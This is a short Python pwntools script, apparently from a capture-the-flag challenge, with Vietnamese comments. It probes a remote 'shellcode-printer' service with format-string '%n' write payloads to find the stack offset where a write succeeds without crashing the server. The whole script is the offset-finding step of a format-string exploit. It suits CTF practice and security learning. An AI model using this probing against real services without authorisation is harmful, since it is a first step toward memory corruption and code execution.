#!/usr/bin/env python3
from pwn import *

REMOTE_SERVER = 'shellcode-printer.nc.jctf.pro'
REMOTE_PORT = 1337

def check_offset(offset):
    try:
        # level='error' để terminal không bị nhiễu bởi các log kết nối
        p = remote(REMOTE_SERVER, REMOTE_PORT, level='error')
        
        # Payload cực ngắn và an toàn.
        # Ghi một giá trị bất kỳ (ở đây là 8) vào một địa chỉ giả.
        # p64(0) = 8 bytes.
        # f'%{offset}$n' = ~4-5 bytes.
        # Tổng cộng: ~12-13 bytes. An toàn dưới 15 bytes.
        payload = p64(0x4141414141414141) + f'%{offset}$n'.encode()

        p.sendlineafter(b'Enter a format string: ', payload)
        
        # Nếu chúng ta có thể nhận lại prompt, offset này hoạt động!
        p.recvuntil(b'Enter a format string: ', timeout=2)
        
        log.success(f"!!! Offset {offset} hoạt động! Kết nối không bị đóng. !!!")
        p.close()
        return True # Trả về True nếu thành công
            
    except Exception:
        log.failure(f"Offset {offset} làm cho server bị crash.")
        p.close()
        return False

# ----- CHẠY CHƯƠG TRÌNH CHÍNH -----
log.info("Bắt đầu tìm kiếm Stack Offset...")
for i in range(1, 25): # Thử một khoảng rộng cho chắc chắn
    if check_offset(i):
        log.critical(f"ĐÃ TÌM THẤY OFFSET HỢP LỆ: {i}. Hãy sử dụng số này cho bước tiếp theo.")
        break # Dừng lại ngay khi tìm thấy offset đầu tiên